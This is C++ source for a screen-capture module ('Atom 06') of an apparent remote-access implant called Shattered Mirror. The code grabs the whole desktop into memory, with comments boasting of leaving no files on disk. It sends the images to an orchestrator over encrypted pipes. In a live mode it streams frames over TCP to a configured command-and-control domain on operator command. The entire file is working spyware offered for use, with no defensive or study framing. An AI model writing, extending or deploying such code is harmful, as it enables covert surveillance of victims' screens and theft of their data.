/*=============================================================================
 * Shattered Mirror v1 — Atom 06: Screen Capture
 * REWRITE: In-memory PNG capture via IStream. No disk drops.
 * GDI+ cleanup properly scoped to avoid crash. DPI-aware.
 * Supports multiple capture commands before exit.
 *===========================================================================*/

#include "Atom_06_Screen.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>
#include <ctime>
#include <unknwn.h>
#include <gdiplus.h>
#include <string>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "ws2_32.lib")

using namespace Gdiplus;

// --------------------------------------------------------------------------
// Debug logging (kept for testing phase)
// --------------------------------------------------------------------------
static void ScreenTrace(const char *format, ...) {
  char buf[512];
  va_list args;
  va_start(args, format);
  int len = vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  if (len > 0) {
    char full[600];
    sprintf_s(full, "[SCRN %lu] %s\n", GetCurrentThreadId(), buf);
    OutputDebugStringA(full);

    HANDLE hFile = CreateFileA("log\\screen_debug.txt",
                               FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                               OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
      char timeStr[64];
      time_t now = time(NULL);
      struct tm tm_info;
      localtime_s(&tm_info, &now);
      strftime(timeStr, sizeof(timeStr), "[%Y-%m-%d %H:%M:%S] ", &tm_info);
      WriteFile(hFile, timeStr, (DWORD)strlen(timeStr), NULL, NULL);
      WriteFile(hFile, full, (DWORD)strlen(full), NULL, NULL);
      FlushFileBuffers(hFile);
      CloseHandle(hFile);
    }
  }
}

static void SendErrorReport(HANDLE hReportPipe, const char *errorMsg,
                            BYTE *pKey) {
  char report[512];
  sprintf_s(report, "[SCREENSHOT_ERROR] %s", errorMsg);
  IPC_MESSAGE outMsg = {0};
  outMsg.dwSignature = 0x534D4952;
  outMsg.CommandId = CMD_REPORT;
  outMsg.dwPayloadLen = (DWORD)strlen(report);
  memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
  IPC_SendMessage(hReportPipe, &outMsg, pKey, 16);
  ScreenTrace("Sent error report: %s", errorMsg);
}

static int GetEncoderClsid(const WCHAR *format, CLSID *pClsid) {
  UINT num = 0, size = 0;
  GetImageEncodersSize(&num, &size);
  if (size == 0)
    return -1;
  ImageCodecInfo *pImageCodecInfo = (ImageCodecInfo *)malloc(size);
  if (!pImageCodecInfo)
    return -1;
  GetImageEncoders(num, size, pImageCodecInfo);
  for (UINT j = 0; j < num; ++j) {
    if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
      *pClsid = pImageCodecInfo[j].Clsid;
      free(pImageCodecInfo);
      return j;
    }
  }
  free(pImageCodecInfo);
  return -1;
}

// --------------------------------------------------------------------------
// Get full virtual screen dimensions (handles multi-monitor + DPI scaling)
// --------------------------------------------------------------------------
static void GetVirtualScreenRect(int &x, int &y, int &w, int &h) {
  x = GetSystemMetrics(SM_XVIRTUALSCREEN);
  y = GetSystemMetrics(SM_YVIRTUALSCREEN);
  w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
  h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
  if (w <= 0 || h <= 0) {
    // Fallback to primary monitor
    x = 0;
    y = 0;
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);
  }
}

// --------------------------------------------------------------------------
// Capture screen to in-memory PNG buffer. Zero disk touch.
// GDI+ Bitmap is properly scoped to destruct BEFORE GdiplusShutdown.
// --------------------------------------------------------------------------
static BOOL CaptureScreenToMemory(std::vector<BYTE> &outBuffer) {
  ScreenTrace("CaptureScreenToMemory started.");

  int screenX, screenY, nScreenWidth, nScreenHeight;
  GetVirtualScreenRect(screenX, screenY, nScreenWidth, nScreenHeight);
  ScreenTrace("Virtual screen: %d,%d %dx%d", screenX, screenY, nScreenWidth,
              nScreenHeight);

  if (nScreenWidth <= 0 || nScreenHeight <= 0) {
    ScreenTrace("ERROR: Invalid screen dimensions.");
    return FALSE;
  }

  HWND hDesktopWnd = GetDesktopWindow();
  HDC hDesktopDC = GetDC(hDesktopWnd);
  if (!hDesktopDC) {
    ScreenTrace("ERROR: GetDC failed. Error: %lu", GetLastError());
    return FALSE;
  }

  HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
  if (!hCaptureDC) {
    ScreenTrace("ERROR: CreateCompatibleDC failed.");
    ReleaseDC(hDesktopWnd, hDesktopDC);
    return FALSE;
  }

  HBITMAP hCaptureBitmap =
      CreateCompatibleBitmap(hDesktopDC, nScreenWidth, nScreenHeight);
  if (!hCaptureBitmap) {
    ScreenTrace("ERROR: CreateCompatibleBitmap failed.");
    DeleteDC(hCaptureDC);
    ReleaseDC(hDesktopWnd, hDesktopDC);
    return FALSE;
  }

  HGDIOBJ hOldObj = SelectObject(hCaptureDC, hCaptureBitmap);
  if (!BitBlt(hCaptureDC, 0, 0, nScreenWidth, nScreenHeight, hDesktopDC,
              screenX, screenY, SRCCOPY)) {
    ScreenTrace("ERROR: BitBlt failed. Error: %lu", GetLastError());
    SelectObject(hCaptureDC, hOldObj);
    DeleteObject(hCaptureBitmap);
    DeleteDC(hCaptureDC);
    ReleaseDC(hDesktopWnd, hDesktopDC);
    return FALSE;
  }
  ScreenTrace("BitBlt succeeded.");

  // GDI+ init
  GdiplusStartupInput gdiplusStartupInput;
  ULONG_PTR gdiplusToken;
  Status gdiStatus = GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
  if (gdiStatus != Ok) {
    ScreenTrace("ERROR: GdiplusStartup failed. Status: %d", gdiStatus);
    SelectObject(hCaptureDC, hOldObj);
    DeleteObject(hCaptureBitmap);
    DeleteDC(hCaptureDC);
    ReleaseDC(hDesktopWnd, hDesktopDC);
    return FALSE;
  }

  BOOL bSuccess = FALSE;

  // Scoped block: Bitmap MUST destruct before GdiplusShutdown
  {
    Bitmap bitmap(hCaptureBitmap, NULL);
    CLSID pngClsid;
    if (GetEncoderClsid(L"image/png", &pngClsid) == -1) {
      ScreenTrace("ERROR: PNG encoder not found.");
    } else {
      // Save to IStream (in-memory) instead of disk
      IStream *pStream = NULL;
      HRESULT hr = CreateStreamOnHGlobal(NULL, TRUE, &pStream);
      if (SUCCEEDED(hr) && pStream) {
        // Set PNG compression quality
        EncoderParameters encoderParams;
        ULONG quality = 80; // Good balance of quality vs size
        encoderParams.Count = 1;
        encoderParams.Parameter[0].Guid = EncoderQuality;
        encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
        encoderParams.Parameter[0].NumberOfValues = 1;
        encoderParams.Parameter[0].Value = &quality;

        Status stat = bitmap.Save(pStream, &pngClsid, &encoderParams);
        if (stat == Ok) {
          // Read the stream into our buffer
          STATSTG stg = {0};
          pStream->Stat(&stg, STATFLAG_NONAME);
          ULONG streamSize = (ULONG)stg.cbSize.QuadPart;

          outBuffer.resize(streamSize);
          LARGE_INTEGER liZero = {0};
          pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
          ULONG bytesRead = 0;
          pStream->Read(outBuffer.data(), streamSize, &bytesRead);

          ScreenTrace("PNG encoded in memory: %lu bytes", bytesRead);
          bSuccess = TRUE;
        } else {
          ScreenTrace("ERROR: GDI+ Save to stream failed. Status: %d", stat);
        }
        pStream->Release();
      } else {
        ScreenTrace("ERROR: CreateStreamOnHGlobal failed. HR: 0x%08X", hr);
      }
    }
  } // Bitmap destructs here — safe to shutdown GDI+ now

  GdiplusShutdown(gdiplusToken);
  SelectObject(hCaptureDC, hOldObj);
  DeleteObject(hCaptureBitmap);
  DeleteDC(hCaptureDC);
  ReleaseDC(hDesktopWnd, hDesktopDC);

  ScreenTrace("GDI+ and GDI cleanup complete. Success: %d", bSuccess);
  return bSuccess;
}

// --------------------------------------------------------------------------
// Send the PNG data via IPC in chunks (MAX_IPC_PAYLOAD_SIZE per message)
// --------------------------------------------------------------------------
static BOOL SendScreenshotData(HANDLE hReportPipe, BYTE *pKey,
                               const std::vector<BYTE> &pngData) {
  DWORD totalSize = (DWORD)pngData.size();
  ScreenTrace("Sending screenshot data: %lu bytes total", totalSize);

  // First send a header report with size info
  char header[256];
  sprintf_s(header, "[SCREENSHOT_DATA] size=%lu", totalSize);
  IPC_MESSAGE hdrMsg = {0};
  hdrMsg.dwSignature = 0x534D4952;
  hdrMsg.CommandId = CMD_REPORT;
  hdrMsg.dwPayloadLen = (DWORD)strlen(header);
  memcpy(hdrMsg.Payload, header, hdrMsg.dwPayloadLen);
  if (!IPC_SendMessage(hReportPipe, &hdrMsg, pKey, 16)) {
    ScreenTrace("ERROR: Failed to send screenshot header");
    return FALSE;
  }

  // Send PNG data in chunks
  DWORD offset = 0;
  DWORD chunkNum = 0;
  while (offset < totalSize) {
    DWORD chunkSize = min(totalSize - offset, MAX_IPC_PAYLOAD_SIZE - 16);
    IPC_MESSAGE dataMsg = {0};
    dataMsg.dwSignature = 0x534D4952;
    dataMsg.CommandId = CMD_REPORT;
    dataMsg.dwPayloadLen = chunkSize;
    memcpy(dataMsg.Payload, pngData.data() + offset, chunkSize);

    if (!IPC_SendMessage(hReportPipe, &dataMsg, pKey, 16)) {
      ScreenTrace("ERROR: Failed to send chunk %lu at offset %lu", chunkNum,
                  offset);
      return FALSE;
    }
    offset += chunkSize;
    chunkNum++;
    ScreenTrace("Sent chunk %lu, %lu/%lu bytes", chunkNum, offset, totalSize);
  }

  ScreenTrace("All %lu chunks sent successfully", chunkNum);
  return TRUE;
}

// --------------------------------------------------------------------------
// Main entry point — supports multiple capture commands
// --------------------------------------------------------------------------
DWORD WINAPI ScreenCaptureAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  ScreenTrace("=== Atom 6 Started. ID: %lu ===", dwAtomId);

  // Set DPI awareness ONCE at atom startup
  HMODULE hUser32 = GetModuleHandleW(L"user32.dll");
  if (hUser32) {
    typedef BOOL(WINAPI * SetProcessDPIAware_t)(void);
    SetProcessDPIAware_t pSetProcessDPIAware =
        (SetProcessDPIAware_t)GetProcAddress(hUser32, "SetProcessDPIAware");
    if (pSetProcessDPIAware) {
      pSetProcessDPIAware();
      ScreenTrace("SetProcessDPIAware called (once).");
    }
  }

  // Connect to command pipe
  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!hCmdPipe) {
    ScreenTrace("FATAL: IPC_ConnectToCommandPipe failed.");
    return 1;
  }

  // Connect to report pipe
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!hReportPipe) {
    ScreenTrace("FATAL: IPC_ConnectToReportPipe failed.");
    CloseHandle(hCmdPipe);
    return 1;
  }

  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  // Send CMD_READY
  IPC_MESSAGE readyMsg = {0};
  readyMsg.dwSignature = 0x534D4952;
  readyMsg.CommandId = CMD_READY;
  readyMsg.dwPayloadLen = 0;
  if (!IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16)) {
    ScreenTrace("ERROR: Failed to send CMD_READY.");
    CloseHandle(hCmdPipe);
    CloseHandle(hReportPipe);
    return 1;
  }
  ScreenTrace("CMD_READY sent. Awaiting commands...");

  // Main command loop — handles multiple captures
  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) &&
        dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          std::string cmd((char*)inMsg.Payload, inMsg.dwPayloadLen);
          
          if (cmd == "LIVE") {
            // === LIVE STREAM MODE ===
            // Adaptive FPS: measures each frame's capture+send time
            // and adjusts delay to maximize throughput without flooding
            ScreenTrace("LIVE STREAM MODE ACTIVATED.");
            DWORD dwFrameCount = 0;
            DWORD dwTargetMs = 500; // Start at ~2 FPS
            
            while (TRUE) {
              DWORD dwStart = GetTickCount();
              
              // Check for STOP command
              DWORD dwStopAvail = 0;
              if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwStopAvail, NULL) && dwStopAvail > 0) {
                IPC_MESSAGE stopMsg = {0};
                if (IPC_ReceiveMessage(hCmdPipe, &stopMsg, SharedSessionKey, 16)) {
                if (stopMsg.CommandId == CMD_TERMINATE || stopMsg.CommandId == CMD_EXECUTE) {
                    ScreenTrace("LIVE STREAM STOPPED. Frames sent: %lu", dwFrameCount);
                    if (stopMsg.CommandId == CMD_TERMINATE) goto cleanup;
                    break; // CMD_EXECUTE with new command
                  }
                }
              }
              
              std::vector<BYTE> pngBuffer;
              if (CaptureScreenToMemory(pngBuffer)) {
                
                // === TURBO TCP STREAMING ===
                // Connect directly to the C2 Bouncer port for high-bandwidth raw streaming
                SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
                if (sock != INVALID_SOCKET) {
                  struct hostent *host = gethostbyname(Config::C2_DOMAIN);
                  if (host) {
                    SOCKADDR_IN sin;
                    memset(&sin, 0, sizeof(sin));
                    sin.sin_family = AF_INET;
                    sin.sin_port = htons(Config::PUBLIC_PORT); // Bouncer routes to Turbo
                    sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                    
                    if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR) {
                        // Send header with NULL terminator so console can parse it
                        char header[128];
                        sprintf_s(header, "[SCREENSHOT] size=%zu", pngBuffer.size());
                        send(sock, header, (int)strlen(header) + 1, 0);
                        
                        // Send data
                        send(sock, (const char*)pngBuffer.data(), (int)pngBuffer.size(), 0);
                        dwFrameCount++;
                    }
                  }
                  closesocket(sock);
                }

                // Adaptive FPS: measure how long this frame took
                DWORD dwElapsed = GetTickCount() - dwStart;
                
                // If frame was fast (< 200ms), we can speed up
                if (dwElapsed < 200 && dwTargetMs > 200) {
                  dwTargetMs -= 50; // Speed up
                }
                // If frame was slow (> 1000ms), slow down
                else if (dwElapsed > 1000 && dwTargetMs < 2000) {
                  dwTargetMs += 100; // Slow down
                }
                
                // Wait remaining time to hit target
                if (dwElapsed < dwTargetMs) {
                  Sleep(dwTargetMs - dwElapsed);
                }
              } else {
                Sleep(500); // Capture failed, wait and retry
              }
            }
          } else if (cmd == "BALE_RUN") {
            ScreenTrace("BALE_RUN received. Capturing screen to file...");
            std::vector<BYTE> pngBuffer;
            if (CaptureScreenToMemory(pngBuffer)) {
               FILE *f = NULL;
               fopen_s(&f, "log\\screenshot.png", "wb");
               if (f) {
                 fwrite(pngBuffer.data(), 1, pngBuffer.size(), f);
                 fclose(f);
                 
                 char fullPath[MAX_PATH];
                 GetFullPathNameA("log\\screenshot.png", MAX_PATH, fullPath, NULL);
                 
                 char report[MAX_PATH + 32];
                 sprintf_s(report, "[SCREENSHOT_READY] %s", fullPath);
                 
                 IPC_MESSAGE msg = {0};
                 msg.dwSignature = 0x534D4952;
                 msg.CommandId = CMD_REPORT;
                 msg.AtomId = 6;
                 msg.dwPayloadLen = (DWORD)strlen(report);
                 memcpy(msg.Payload, report, msg.dwPayloadLen);
                 IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
                 ScreenTrace("BALE screenshot saved and reported.");
               }
            }
          } else {
            // === SINGLE SHOT MODE (original) ===
            ScreenTrace("CMD_EXECUTE received. Capturing screen...");

            std::vector<BYTE> pngBuffer;
            if (CaptureScreenToMemory(pngBuffer)) {
              ScreenTrace("Capture OK. Sending %zu bytes via IPC...",
                          pngBuffer.size());
              if (SendScreenshotData(hReportPipe, SharedSessionKey, pngBuffer)) {
                ScreenTrace("Screenshot sent successfully.");
              } else {
                SendErrorReport(hReportPipe, "Failed to send PNG data",
                                SharedSessionKey);
              }
            } else {
              ScreenTrace("ERROR: CaptureScreenToMemory failed.");
              SendErrorReport(hReportPipe, "Screen capture failed",
                              SharedSessionKey);
            }
          }
          // Stay alive for more commands
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          ScreenTrace("CMD_TERMINATE received. Exiting.");
          break;
        }
      }
    } else {
      DWORD err = GetLastError();
      if (err == ERROR_BROKEN_PIPE) {
        ScreenTrace("Command pipe broken. Exiting.");
        break;
      }
    }
    Sleep(100);
  }

cleanup:
  CloseHandle(hCmdPipe);
  CloseHandle(hReportPipe);
  ScreenTrace("Atom 6 exiting cleanly.");
  return 0;
}